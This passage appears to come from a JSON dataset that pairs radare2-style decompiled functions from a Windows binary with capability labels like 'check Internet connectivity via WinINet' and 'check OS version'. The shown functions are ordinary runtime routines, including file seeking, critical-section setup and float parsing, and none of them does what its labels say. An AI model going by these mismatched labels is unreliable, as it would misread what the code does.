        "decompiled_code": "\nulong fcn.14000e380(ulong noname_0, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg2 != 2) {\n        if (arg2 < 3) {\n            if (arg2 == 0) {\n                if (*0x140129108 != 0) {\n                    fcn.14000e210();\n                }\n                iVar2 = *0x140129100;\n                if (*0x140129108 == 1) {\n                    while (iVar2 != 0) {\n                        iVar1 = *(iVar2 + 0x10);\n                        fcn.1400185e0(iVar2);\n                        iVar2 = iVar1;\n                    }\n                    *0x140129100 = 0;\n                    *0x140129108 = 0;\n                    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x140129120);\n                }\n            }\n            else {\n                if (*0x140129108 == 0) {\n                    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x140129120);\n                }\n                *0x140129108 = 1;\n            }\n        }\n        else if ((arg2 == 3) && (*0x140129108 != 0)) {\n            fcn.14000e210();\n        }\n        return 1;\n    }\n    fcn.14000dad0();\n    return 1;\n}\n",
        "token_count": 310
    },
    "14000ecd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.14000ecd0(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    ulong in_RAX;\n    \n    if (arg2 < 2) {\n        arg1[arg2 + 2] = arg3;\n        return in_RAX;\n    }\n    sub.msvcrt.dll_abort();\n    return *arg1;\n}\n",
        "token_count": 77
    },
    "14000f0b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000f0b0(int64_t arg1)\n\n{\n    if (*(arg1 + 0x10) != 0) goto code_r0x00014000f0c5;\n    fcn.14000efc0(arg1);\n    do {\n        sub.msvcrt.dll_abort();\ncode_r0x00014000f0c5:\n        fcn.14000ec50(arg1);\n    } while( true );\n}\n",
        "token_count": 99
    },
    "14000fa5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.14000fa50(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    int64_t aiStack32 [2];\n    \n    if (arg3 == 1) {\n        iVar1 = sub.msvcrt.dll_fgetpos();\n        if (iVar1 != 0) {\n            return 0xffffffff;\n        }\n        arg2 = arg2 + aiStack32[0];\n    }\n    else if (arg3 == 2) {\n        sub.msvcrt.dll_fflush();\n        uVar2 = sub.msvcrt.dll__fileno(arg1);\n        iVar4 = sub.msvcrt.dll__filelengthi64(uVar2);\n        arg2 = arg2 + iVar4;\n    }\n    else if (arg3 != 0) {\n        puVar5 = sub.msvcrt.dll__errno();\n        *puVar5 = 0x16;\n        return 0xffffffff;\n    }\n    aiStack32[0] = arg2;\n    uVar3 = sub.msvcrt.dll_fsetpos(arg1, aiStack32);\n    return uVar3;\n}\n",
        "token_count": 272
    },
    "14000fcc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.14000fcc0(ulong arg1, uint32_t *arg2, uint32_t *arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t arg1_00;\n    uint *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t uStack80;\n    uint32_t auStack76 [3];\n    uint64_t arg2_00;\n    \n    arg1_00 = fcn.140017990(arg1, auStack76, &uStack80);\n    uVar3 = *arg2;\n    uVar8 = uStack80 - uVar3;\n    arg2_00 = uVar8;\n    auStack76[0] = auStack76[0] + uVar8;\n    if (uVar8 < 1) {\n        uVar5 = 0;\n        if (in_stack_00000028 == 0) goto code_r0x00014000fdd0;\n        if (uVar8 != 0) {\n            uVar5 = uVar3 - uStack80;\n            uStack80 = uVar8;\n            arg1_00 = fcn.140017540(arg1_00, uVar5);\n            uVar8 = uStack80;\n        }\n        uStack80 = uVar8;\n        uVar4 = 0;\n        uVar9 = 0;\n    }\n    else if (uVar3 == 0x35) {\n        uVar5 = 0;\n        if ((in_stack_00000028 == 0) || (uVar5 = 0,  arg2[3] != 1)) goto code_r0x00014000fdd0;\n        uStack80 = uVar8;\n        uVar4 = fcn.140017d10(arg1_00, arg2_00);\n        uVar9 = (uVar4 != 0) << 4;\n        fcn.140016880(arg1_00, uStack80);\n    }\n    else if (in_stack_00000030 == 1) {\n        uStack80 = uVar8;\n        uVar4 = fcn.140017d10(arg1_00, arg2_00);\n        fcn.140016880(arg1_00, uStack80);\ncode_r0x00014000ff46:\n        uVar9 = (uVar4 != 0) << 4;\n    }\n    else {\n        if (in_stack_00000030 == 2) {\n            uStack80 = uVar8;\n            uVar4 = fcn.140017d10(arg1_00, arg2_00);\n            fcn.140016880(arg1_00, uStack80);\n        }\n        else {\n            iVar7 = uVar8 - 1;\n            if (iVar7 == 0) {\n                uVar5 = 0;\n                if (in_stack_00000028 == 0) goto code_r0x00014000fdd0;\n                uVar5 = *(arg1_00 + 0x18) >> 1;\n            }\n            else {\n                uVar5 = *(arg1_00 + 0x18 + (iVar7 >> 5) * 4) >> (iVar7 & 0x1f);\n            }\n            uStack80 = uVar8;\n            uVar4 = fcn.140017d10(arg1_00, arg2_00);\n            fcn.140016880(arg1_00, uStack80);\n            if ((uVar5 & 1) == 0) goto code_r0x00014000ff46;\n        }\n        arg1_00 = fcn.14000fc00(arg1_00);\n        uVar8 = uVar3 & 0x1f;\n        if (uVar8 != 0) {\n            uVar8 = 0x20 - uVar8;\n        }\n        puVar2 = arg1_00 + 0x18 + (*(arg1_00 + 0x14) + -1) * 4;\n        uVar5 = 0x1f;\n        if (*puVar2 != 0) {\n            for (; *puVar2 >> uVar5 == 0; uVar5 = uVar5 - 1) {\n            }\n        }\n        if ((uVar5 ^ 0x1f) == uVar8) {\n            uVar9 = 0x20;\n        }\n        else {\n            if (uVar4 == 0) {\n                uVar4 = *(arg1_00 + 0x18) & 1;\n            }\n            fcn.140016880(arg1_00, 1);\n            uVar9 = 0x20;\n            auStack76[0] = auStack76[0] + 1;\n        }\n    }\n    uVar8 = arg2[1];\n    if (auStack76[0] < uVar8) {\n        uVar10 = uVar8 - auStack76[0];\n        auStack76[0] = uVar8;\n        if ((uVar3 < uVar10) || (uVar5 = arg2[4],  uVar5 != 0)) {\n            *(arg1_00 + 0x14) = 0;\n            *in_stack_00000038 = 0x50;\n            uVar5 = 0;\n        }\n        else {\n            uVar1 = uVar10 - 1;\n            if ((0 < uVar1) && (uVar4 == 0)) {\n                uVar4 = fcn.140017d10(arg1_00, uVar1);\n            }\n            uVar8 = uStack80;\n            if ((uVar4 | in_stack_00000028) == 0) goto code_r0x00014000fdd0;\n            uVar8 = *(arg1_00 + 0x18 + (uVar1 >> 5) * 4);\n            fcn.140016880(arg1_00, uVar10);\n            *in_stack_00000038 = 2;\n            if ((uVar8 & 1 << (uVar1 & 0x1f)) == 0) {\n                uVar5 = 0x50;\n                if (uVar4 == 0) {\n                    uVar5 = uVar9;\n                }\n            }\n            else {\n                arg1_00 = fcn.14000fc00(arg1_00);\n                uVar5 = 0x60;\n            }\n        }\n    }\n    else {\n        uVar8 = arg2[2];\n        uVar5 = uVar9;\n        if (uVar8 < auStack76[0]) {\n            *in_stack_00000038 = 0xa3;\n            auStack76[0] = uVar8 + 1;\n            puVar6 = sub.msvcrt.dll__errno();\n            *puVar6 = 0x22;\n            *(arg1_00 + 0x14) = 0;\n            uVar5 = 0;\n        }\n    }\n    *arg3 = auStack76[0];\n    fcn.140017ca0(arg4, uVar3, arg1_00);\n    *in_stack_00000038 = *in_stack_00000038 | uVar5;\n    uVar8 = uStack80;\n    uVar5 = 1;\ncode_r0x00014000fdd0:\n    uStack80 = uVar8;\n    fcn.140017070(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 1739
    },
    "1400101c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.1400101c0(char *arg1, char **arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    char **ppcVar9;\n    char *pcVar10;\n    int64_t iVar11;\n    int64_t arg1_00;\n    int64_t arg2_00;\n    int64_t arg1_01;\n    uint64_t uVar12;\n    ulong arg1_02;\n    uint64_t uVar13;\n    uint *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint64_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    char cVar22;\n    char *pcVar23;\n    char *pcVar24;\n    uint64_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    double dVar29;\n    double dVar30;\n    double extraout_XMM0_Qa;\n    uint uVar31;\n    uint uVar32;\n    double dVar33;\n    uint uVar34;\n    uint uVar35;\n    uint uVar36;\n    uint uVar37;\n    uchar auVar38 [16];\n    uint64_t in_stack_00000028;\n    ulong uStack280;\n    uint32_t uStack264;\n    int32_t iStack260;\n    int32_t iStack252;\n    int32_t iStack248;\n    uint32_t uStack244;\n    uint32_t uStack208;\n    uint32_t uStack204;\n    uint32_t uStack188;\n    uchar auStack184 [4];\n    uint32_t uStack180;\n    uint32_t uStack176;\n    uint32_t uStack172;\n    char *pcStack168;\n    uint64_t auStack160 [12];\n    \n    ppcVar9 = sub.msvcrt.dll_localeconv();\n    pcVar24 = *ppcVar9;\n    sub.msvcrt.dll_strlen();\n    uStack180 = 0;\n    auStack160[0] = 0;\n    uVar1 = *arg3;\n    pcVar10 = arg1;\ncode_r0x000140010249:\n    cVar22 = *pcVar10;\n    // switch table (46 cases) at 0x14010250c\n    switch(cVar22) {\n    case '\\0':\ncode_r0x00014001031b:\n        if (arg2 != NULL) {\n            *arg2 = arg1;\n        }\n        return 6;\n    default:\n        iStack252 = 0;\n        pcStack168 = pcVar10;\n        goto code_r0x000140010280;\n    case '\\t':\n    case '\\n':\n    case '\\v':\n    case '\\f':\n    case '\\r':\n    case ' ':\n        goto code_r0x000140010378;\n    case '+':\n        iStack252 = 0;\n        break;\n    case '-':\n        iStack252 = 1;\n    }\n    pcStack168 = pcVar10 + 1;\n    cVar22 = pcVar10[1];\n    if (cVar22 != '\\0') {\ncode_r0x000140010280:\n        uVar7 = 0;\n        if (cVar22 != '0') goto code_r0x00014001028d;\n        if ((pcStack168[1] & 0xdfU) != 0x58) goto code_r0x0001400105c0;\n        uStack180 = fcn.140015f90(&pcStack168, arg3, arg4, auStack160);\n        if (uStack180 != 6) goto code_r0x0001400105f8;\n        pcStack168 = arg1;\n        if (arg2 != NULL) {\n            *arg2 = arg1;\n        }\n        goto code_r0x000140010626;\n    }\n    goto code_r0x00014001031b;\ncode_r0x000140010378:\n    pcVar10 = pcVar10 + 1;\n    goto code_r0x000140010249;\ncode_r0x0001400105c0:\n    do {\n        pcStack168 = pcStack168 + 1;\n        cVar22 = *pcStack168;\n    } while (cVar22 == '0');\n    uVar7 = 1;\n    if (cVar22 == '\\0') goto code_r0x0001400105f8;\ncode_r0x00014001028d:\n    pcVar10 = pcStack168;\n    uStack208 = arg3[4];\n    uVar5 = cVar22;\n    if (uVar5 - 0x30 < 10) {\n        uVar12 = 0;\n        uVar21 = 0;\n        uVar17 = 0;\n        do {\n            pcStack168 = pcStack168 + 1;\n            if (uVar17 < 9) {\n                uVar21 = (uVar5 - 0x30) + uVar21 * 10;\n            }\n            else if (uVar17 < 0x10) {\n                uVar12 = (uVar5 - 0x30) + uVar12 * 10;\n            }\n            cVar22 = *pcStack168;\n            uVar5 = cVar22;\n            uVar17 = uVar17 + 1;\n        } while (uVar5 - 0x30 < 10);\n    }\n    else {\n        uVar12 = 0;\n        uVar21 = 0;\n        uVar17 = 0;\n    }\n    if (*pcVar24 == cVar22) {\n        iVar11 = 1;\n        cVar22 = pcVar24[1];\n        while (cVar22 != '\\0') {\n            if (pcStack168[iVar11] != cVar22) goto code_r0x0001400103a1;\n            iVar11 = iVar11 + 1;\n            cVar22 = pcVar24[iVar11];\n        }\n        pcStack168 = pcStack168 + iVar11;\n        uVar5 = *pcStack168;\n        if (uVar17 == 0) {\n            pcVar24 = pcStack168;\n            if (uVar5 == 0x30) {\n                do {\n                    pcVar23 = pcVar24;\n                    pcVar24 = pcVar23 + 1;\n                    uVar5 = *pcVar24;\n                } while (uVar5 == 0x30);\n                uVar20 = (pcVar23 - pcStack168) + 1;\n                pcStack168 = pcVar24;\n            }\n            else {\n                uVar20 = 0;\n            }\n            pcVar24 = pcStack168;\n            if (uVar5 - 0x31 < 9) {\n                uVar28 = uVar5 - 0x30;\n                iStack260 = uVar20 + 1;\n                uVar25 = 1;\n                goto code_r0x000140010ff0;\n            }\n            iStack260 = 0;\n            uVar25 = 0;\n        }\n        else {\n            iStack260 = 0;\n            uVar25 = uVar17;\n            uVar20 = 0;\n            pcVar24 = pcStack168;\n            pcStack168 = pcVar10;\n            while (uVar28 = uVar5 - 0x30,  pcVar10 = pcStack168,  uVar28 < 10) {\n                uVar5 = uVar25;\n                uVar20 = uVar20 + 1;\n                if (uVar28 != 0) {\n                    if (uVar20 == 1) {\n                        uVar16 = uVar5 + 1;\n                    }\n                    else {\n                        uVar16 = uVar20 + uVar5;\n                        do {\n                            uVar19 = uVar25;\n                            uVar5 = uVar19 + 1;\n                            uVar25 = uVar5;\n                            if (uVar19 < 9) {\n                                uVar21 = uVar21 * 10;\n                            }\n                            else if (uVar5 < 0x11) {\n                                uVar12 = uVar12 * 10;\n                            }\n                        } while (uVar16 - 1 != uVar5);\n                    }\n                    iStack260 = iStack260 + uVar20;\n                    if (uVar5 < 9) {\n                        uVar25 = uVar16;\ncode_r0x000140010ff0:\n                        uVar20 = 0;\n                        uVar21 = uVar28 + uVar21 * 10;\n                    }\n                    else {\n                        uVar20 = 0;\n                        uVar25 = uVar16;\n                        if (uVar16 < 0x11) {\n                            uVar12 = uVar28 + uVar12 * 10;\n                        }\n                    }\n                }\n                uVar5 = pcVar24[1];\n                pcVar24 = pcVar24 + 1;\n            }\n        }\n        pcStack168 = pcVar24;\n        bVar3 = true;\n    }\n    else {\ncode_r0x0001400103a1:\n        iStack260 = 0;\n        uVar25 = uVar17;\n        uVar20 = 0;\n        bVar3 = false;\n    }\n    pcVar24 = pcStack168;\n    uVar28 = uVar25;\n    if ((uVar5 & 0xffffffdf) == 0x45) {\n        if ((uVar28 | uVar20 | uVar7) != 0) {\n            cVar22 = pcStack168[1];\n            if (cVar22 == '+') {\n                bVar4 = false;\ncode_r0x000140010e90:\n                cVar22 = pcStack168[2];\n                pcStack168 = pcStack168 + 2;\n            }\n            else {\n                if (cVar22 == '-') {\n                    bVar4 = true;\n                    goto code_r0x000140010e90;\n                }\n                bVar4 = false;\n                pcStack168 = pcStack168 + 1;\n            }\n            uVar5 = cVar22;\n            uVar16 = uVar5 - 0x30;\n            arg1 = pcVar24;\n            if (9 < uVar16) {\n                pcStack168 = pcVar24;\n                uVar16 = 0;\n                goto code_r0x0001400103c8;\n            }\n            if (uVar5 == 0x30) {\n                do {\n                    pcStack168 = pcStack168 + 1;\n                    uVar5 = *pcStack168;\n                } while (uVar5 == 0x30);\n                uVar16 = 0;\n                if (8 < uVar5 - 0x31) goto code_r0x0001400103c8;\n                uVar16 = uVar5 - 0x30;\n            }\n            uVar5 = pcStack168[1];\n            pcVar24 = pcStack168 + 1;\n            if (uVar5 - 0x30 < 10) {\n                pcVar23 = pcStack168 + 2;\n                do {\n                    pcVar24 = pcVar23;\n                    uVar16 = (uVar5 - 0x30) + uVar16 * 10;\n                    uVar5 = *pcVar24;\n                    pcVar23 = pcVar24 + 1;\n                } while (uVar5 - 0x30 < 10);\n                iVar11 = pcVar24 - pcStack168;\n                pcStack168 = pcVar24;\n                uVar19 = 19999;\n                if (iVar11 < 9) goto code_r0x000140011975;\n            }\n            else {\ncode_r0x000140011975:\n                pcStack168 = pcVar24;\n                uVar19 = 19999;\n                if (uVar16 < 20000) {\n                    uVar19 = uVar16;\n                }\n            }\n            uVar16 = -uVar19;\n            if (!bVar4) {\n                uVar16 = uVar19;\n            }\n            goto code_r0x0001400103c8;\n        }\n        goto code_r0x00014001065e;\n    }\n    pcStack168 = pcVar24;\n    uVar16 = 0;\ncode_r0x0001400103c8:\n    if (uVar28 == 0) {\n        if ((uVar20 | uVar7) != 0) goto code_r0x0001400105f8;\n        if (bVar3) goto code_r0x00014001065e;\n        if (uVar5 == 0x69) {\ncode_r0x000140011043:\n            iVar6 = fcn.140017c50(&pcStack168, 0x140102500);\n            if (iVar6 != 0) {\n                pcStack168 = pcStack168 + -1;\n                iVar6 = fcn.140017c50(&pcStack168, \"inity\");\n                if (iVar6 == 0) {\n                    pcStack168 = pcStack168 + 1;\n                }\n                uStack180 = 3;\ncode_r0x000140011092:\n                *arg4 = arg3[2] + 1;\n                goto code_r0x0001400105f8;\n            }\n        }\n        else if (uVar5 < 0x6a) {\n            if (uVar5 == 0x49) goto code_r0x000140011043;\n            if (uVar5 == 0x4e) goto code_r0x000140010404;\n        }\n        else if (uVar5 == 0x6e) {\ncode_r0x000140010404:\n            iVar6 = fcn.140017c50(&pcStack168, 0x140102509);\n            if (iVar6 != 0) {\n                uStack180 = 4;\n                *arg4 = arg3[2] + 1;\n                if (*pcStack168 != '(') goto code_r0x0001400105f8;\n                uStack180 = fcn.140016a60(&pcStack168, arg3, in_stack_00000028);\n                goto code_r0x000140011092;\n            }\n        }\ncode_r0x00014001065e:\n        uStack180 = 6;\n        pcStack168 = arg1;\n        goto code_r0x0001400105f8;\n    }\n    uStack180 = 1;\n    uVar7 = uVar16 - iStack260;\n    uVar5 = arg3[3] & 3;\n    uStack244 = uVar5 - iStack252;\n    uVar13 = uStack244;\n    if (uVar5 != 2) {\n        uStack244 = iStack252 + 1;\n        uVar13 = uStack244;\n        if (uVar5 != 3) {\n            uStack244 = uVar5 == 0;\n        }\n    }\n    dVar29 = uVar21;\n    uVar18 = uVar17;\n    if (uVar17 == 0) {\n        uVar18 = uVar25;\n    }\n    uVar5 = 0x10;\n    if (uVar28 < 0x11) {\n        uVar5 = uVar28;\n    }\n    if (9 < uVar28) {\n        dVar29 = dVar29 * *(*0x140103700 + (uVar5 - 9) * 8) + uVar12;\n        uVar13 = *0x140103700;\n    }\n    if ((uVar1 < 0x36) && (uVar28 < 0x10)) {\n        if (uVar7 == 0) {\n            iVar6 = fcn.14000fcc0(uVar13, arg3, arg4, in_stack_00000028);\njoined_r0x000140011938:\n            if (iVar6 != 0) goto code_r0x0001400105f8;\n            uVar17 = uVar28 - uVar5;\n            uVar20 = uVar17;\n            if (0 < uVar17) goto code_r0x0001400107f3;\ncode_r0x000140010e58:\n            if (uVar17 == 0) goto code_r0x00014001081a;\n        }\n        else {\n            if (0 < uVar7) {\n                if (uVar7 < 0x17) {\n                    uVar17 = SUB84(dVar29, 0);\n                    if (uVar17 == 0) {\n                        iVar6 = 0;\n                        for (uVar17 = dVar29 >> 0x20 | 0x100000; (uVar17 & 1) == 0; uVar17 = uVar17 >> 1 | 0x80000000) {\n                            iVar6 = iVar6 + 1;\n                        }\n                        uVar17 = 0x15 - iVar6;\n                    }\n                    else {\n                        iVar6 = 0;\n                        for (; (uVar17 & 1) == 0; uVar17 = uVar17 >> 1 | 0x80000000) {\n                            iVar6 = iVar6 + 1;\n                        }\n                        uVar17 = 0x35 - iVar6;\n                    }\n                    uVar13 = uVar17;\n                    dVar29 = dVar29 * *(*0x140103700 + uVar7 * 8);\n                }\n                else {\n                    if (0x25 - uVar28 < uVar7) {\n                        uVar17 = (uVar28 - uVar5) + uVar7;\n                        goto code_r0x000140010e42;\n                    }\n                    uVar17 = uVar7 - (0xf - uVar28);\n                    uVar13 = uVar17;\n                    dVar29 = dVar29 * *(*0x140103700 + (0xf - uVar28) * 8) * *(*0x140103700 + uVar17 * 8);\n                }\ncode_r0x0001400107bc:\n                iVar6 = fcn.14000fcc0(uVar13, arg3, arg4, in_stack_00000028);\n                goto joined_r0x000140011938;\n            }\n            uVar17 = (uVar28 - uVar5) + uVar7;\n            if (-0x17 < uVar7) {\n                dVar29 = dVar29 / *(*0x140103700 + (iStack260 - uVar16) * 8);\n                goto code_r0x0001400107bc;\n            }\n        }\n        uVar5 = -uVar17;\n        if ((uVar5 & 0xf) != 0) {\n            dVar29 = dVar29 / *(*0x140103700 + (uVar5 & 0xf) * 8);\n        }\n        uVar17 = uVar5 & 0xfffffff0;\n        if (uVar17 != 0) {\n            uVar5 = uVar5 >> 4;\n            if (uVar17 < 0x100) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = 0;\n                uVar17 = uVar5;\n                do {\n                    uVar17 = uVar17 - 0x10;\n                    uVar20 = dVar29 >> 0x20;\n                    iVar6 = iVar6 + -0x3ff + (uVar20 >> 0x14 & 0x7ff);\n                    dVar29 = (dVar29 & 0xffffffff | (uVar20 & 0x800fffff | 0x3ff00000) << 0x20) * *(*0x140103710 + 0x20)\n                    ;\n                } while (0xf < uVar17);\n                uVar5 = uVar5 & 0xf;\n            }\n            uVar17 = iVar6 + -0x3ff + (dVar29 >> 0x34 & 0x7ff);\n            uVar13 = dVar29 & 0xffffffff;\n            if (uVar5 != 0) {\n                uVar13 = 0;\n                do {\n                    if ((uVar5 & 1) != 0) {\n                        uVar13 = 1;\n                    }\n                    uVar5 = uVar5 >> 1;\n                } while (uVar5 != 0);\n            }\n        }\n    }\n    else {\n        uVar17 = (uVar28 - uVar5) + uVar7;\n        if (uVar17 < 1) goto code_r0x000140010e58;\ncode_r0x000140010e42:\n        uVar20 = uVar17 & 0xf;\n        uVar5 = uVar17;\n        if (uVar20 != 0) {\ncode_r0x0001400107f3:\n            dVar29 = dVar29 * *(*0x140103700 + uVar20 * 8);\n            uVar5 = uVar17;\n        }\n        uVar17 = uVar5 & 0xfffffff0;\n        if (uVar17 != 0) {\n            uVar5 = uVar5 >> 4;\n            if (uVar17 < 0x100) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = 0;\n                uVar17 = uVar5;\n                do {\n                    uVar17 = uVar17 - 0x10;\n                    uVar20 = dVar29 >> 0x20;\n                    iVar6 = iVar6 + -0x3ff + (uVar20 >> 0x14 & 0x7ff);\n                    dVar29 = (dVar29 & 0xffffffff | (uVar20 & 0x800fffff | 0x3ff00000) << 0x20) * *(*0x140103610 + 0x20)\n                    ;\n                } while (0xf < uVar17);\n                uVar5 = uVar5 & 0xf;\n            }\n            uVar17 = dVar29 >> 0x34 & 0x7ff;\n            uVar13 = uVar17;\n            uVar17 = iVar6 + -0x3ff + uVar17;\n            if (uVar5 != 0) {\n                uVar13 = 0;\n                do {\n                    if ((uVar5 & 1) != 0) {\n                        uVar13 = 1;\n                    }\n                    uVar5 = uVar5 >> 1;\n                } while (uVar5 != 0);\n            }\n        }\n    }\ncode_r0x00014001081a:\n    auStack160[0] = fcn.140017990(uVar13, &uStack172, &uStack176);\n    uStack172 = uVar17 + uStack172;\n    uVar5 = uStack176 - uVar1;\n    if (0 < uVar5) {\n        fcn.140016880(auStack160[0], uVar5);\n        uStack172 = uStack172 + uVar5;\n        uStack176 = uVar1;\n    }\n    uStack204 = (uStack172 + uStack176) - uVar1;\n    if (arg3[2] + 1 < uStack204) {\n        uStack264 = 0;\n        goto code_r0x0001400117f8;\n    }\n    uVar5 = arg3[1];\n    if (uVar5 <= uStack204) {\n        uStack264 = 0;\n        goto code_r0x00014001094a;\n    }\n    uVar17 = uStack172 - uVar5;\n    if (0 < uVar17) {\n        auStack160[0] = fcn.140017540(auStack160[0], uVar17);\n        uStack176 = uStack176 + uVar17;\ncode_r0x000140010910:\n        if (uStack208 == 0) {\n            uStack264 = 1;\n            uStack204 = uVar5;\n            uStack172 = uVar5;\ncode_r0x00014001094a:\n            iVar11 = fcn.140017ac0(pcVar10, uVar18, uVar25, uVar21);\n            uVar34 = SUB84(*0x140102640, 0);\n            uVar35 = *0x140102640 >> 0x20;\n            uVar36 = *0x140102648;\n            uVar37 = *0x140102648 >> 0x20;\n            auVar38 = ZEXT816(*0x140102670);\n            uVar21 = 0;\n            if (uVar7 < 0) {\n                uVar21 = iStack260 - uVar16;\n            }\n            uVar17 = 0;\n            if (uVar7 >= 0) {\n                uVar17 = uVar7;\n            }\n            uVar20 = 0;\n            do {\n                arg1_00 = fcn.140016f80(*(iVar11 + 8));\n                sub.msvcrt.dll_memcpy(arg1_00 + 0x10, iVar11 + 0x10, *(iVar11 + 0x14) * 4 + 8);\n                arg2_00 = fcn.140016f80(*(auStack160[0] + 8));\n                sub.msvcrt.dll_memcpy(arg2_00 + 0x10);\n                uVar16 = uStack172;\n                uVar28 = uStack176;\n                uStack280 = fcn.1400171a0(1);\n                iVar6 = uVar16 + uVar20;\n                uVar19 = uVar28 - uVar20;\n                if (iVar6 < 0) {\n                    uVar27 = uVar17 - iVar6;\n                    uVar26 = uVar21;\n                }\n                else {\n                    uVar27 = uVar17;\n                    uVar26 = iVar6 + uVar21;\n                }\n                iVar8 = (uVar28 + uVar16) - uVar1;\n                iVar6 = (uVar1 + 1) - uVar19;\n                if (iVar8 < uVar5) {\n                    iVar6 = (iVar8 - uVar5) + iVar6;\n                }\n                uVar28 = uVar26 + iVar6;\n                uVar27 = uVar27 + iVar6;\n                uVar16 = uVar27;\n                if (uVar28 <= uVar27) {\n                    uVar16 = uVar28;\n                }\n                if (uVar26 < uVar16) {\n                    uVar16 = uVar26;\n                }\n                if (0 < uVar16) {\n                    uVar28 = uVar28 - uVar16;\n                    uVar27 = uVar27 - uVar16;\n                    uVar26 = uVar26 - uVar16;\n                }\n                arg1_01 = arg2_00;\n                if (0 < uVar21) {\n                    uStack280 = fcn.1400173c0(uStack280, uVar21);\n                    arg1_01 = fcn.140017260(uStack280, arg2_00);\n                    fcn.140017070(arg2_00);\n                }\n                uVar16 = uVar28 - uVar20;\n                if (uVar16 < 1) {\n                    if (uVar16 != 0) {\n                        fcn.140016880(arg1_01, uVar20 - uVar28);\n                    }\n                }\n                else {\n                    arg1_01 = fcn.140017540(arg1_01, uVar16);\n                }\n                if (0 < uVar7) {\n                    arg1_00 = fcn.1400173c0(arg1_00, uVar17);\n                }\n                if (0 < uVar27) {\n                    arg1_00 = fcn.140017540(arg1_00, uVar27);\n                }\n                if (0 < uVar26) {\n                    uStack280 = fcn.140017540(uStack280, uVar26);\n                }\n                uVar12 = fcn.1400176a0(arg1_01, arg1_00);\n                uVar28 = uStack208;\n                if ((*(uVar12 + 0x14) < 2) && (*(uVar12 + 0x18) == 0)) goto code_r0x000140011450;\n                uVar16 = *(uVar12 + 0x10);\n                *(uVar12 + 0x10) = 0;\n                uVar25 = uVar12;\n                iVar6 = fcn.140017650(uVar12, uStack280);\n                if ((uStack244 == 0) || (0 < iVar6)) {\n                    if (iVar6 < 0) {\n                        if (uVar16 == 0) {\n                            uStack180 = 0x21;\n                            if (((1 < uVar19) || (uStack204 == uVar5)) || (uStack264 != 0)) goto code_r0x000140011450;\n                            uVar12 = fcn.140017540(uVar12, 1);\n                            iVar6 = fcn.140017650(uVar12, uStack280);\n                            uVar27 = uStack176;\n                            if (iVar6 < 1) goto code_r0x0001400116d1;\n                            uStack180 = 0x11;\n                            uStack264 = 0;\ncode_r0x000140011a16:\n                            uStack172 = uStack172 - uVar1;\ncode_r0x0001400117ce:\n                            uStack176 = uVar1;\n                            auStack160[0] = fcn.1400100c0(auStack160[0], uVar1);\n                        }\n                        else {\ncode_r0x000140011c70:\n                            uStack180 = 0x11;\n                        }\n                        goto code_r0x000140011450;\n                    }\n                    if (iVar6 == 0) {\n                        if (uVar16 == 0) {\n                            uStack180 = 0x21;\n                            if (uVar19 == 1) {\n                                uStack180 = 1;\n                                if (uStack204 != uVar5) goto code_r0x000140011a16;\n                                uStack180 = 0x21;\n                                if ((*(auStack160[0] + 0x14) == 1) && (uVar28 = uVar19,  *(auStack160[0] + 0x18) != 1))\n                                {\n                                    uVar28 = uStack208;\n                                }\n                                goto code_r0x000140011450;\n                            }\n                        }\n                        else {\n                            if (uStack264 != 0) {\n                                puVar15 = auStack160[0] + 0x18;\n                                goto code_r0x000140011aba;\n                            }\n                            uStack180 = 0x11;\n                        }\n                        if ((uVar19 < uVar1) && (uVar27 = uStack176,  uStack264 == 0)) goto code_r0x0001400116d1;\n                        if ((*(auStack160[0] + 0x18) & 1) == 0) goto code_r0x000140011450;\n                        if (uVar16 != 0) goto code_r0x000140011d7d;\n                        if (uVar19 != 1) {\n                            fcn.140010090(auStack160[0]);\n                            goto 